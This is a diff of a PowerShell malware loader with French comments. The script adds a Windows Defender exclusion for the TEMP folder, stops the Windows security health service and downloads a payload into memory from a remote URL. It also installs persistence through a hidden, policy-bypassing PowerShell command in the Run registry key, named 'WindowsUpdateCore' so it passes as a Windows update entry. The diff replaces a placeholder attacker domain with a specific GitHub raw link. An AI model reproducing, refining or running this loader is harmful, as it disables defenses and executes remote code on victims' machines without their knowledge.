@@ -10,7 +10,7 @@ Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
 Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue
 
 # --- TÉLÉCHARGER PAYLOAD EN MÉMOIRE ---
-$url = "https://ton-domaine-anonyme.com/payload.dll"
+$url = "https://raw.githubusercontent.com/niangdipka1-beep/windslayer_final.ps1/main/%23%20windslayer_final.ps1%20-%20Z%C3%A9ro%20bruit.txt"
 $wc = New-Object Net.WebClient
 $wc.Headers.Add("User-Agent", "Mozilla/5.0")
 $bytes = $wc.DownloadData($url)
@@ -30,7 +30,7 @@ try {
 
 # --- PERSISTANCE DISCRÈTE ---
 $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$cmd = "powershell -w hidden -ep bypass -c `$_=New-Object Net.WebClient;IEX `$_`.DownloadString('https://ton-domaine-anonyme.com/windslayer_final.ps1')"
+$cmd = "powershell -w hidden -ep bypass -c `$_=New-Object Net.WebClient;IEX `$_`.DownloadString('https://raw.githubusercontent.com/niangdipka1-beep/windslayer_final.ps1/main/%23%20windslayer_final.ps1%20-%20Z%C3%A9ro%20bruit.txt')"
 Set-ItemProperty -Path $regKey -Name "WindowsUpdateCore" -Value $cmd -Type String -Force
 
 # --- NETTOYAGE RAM ---
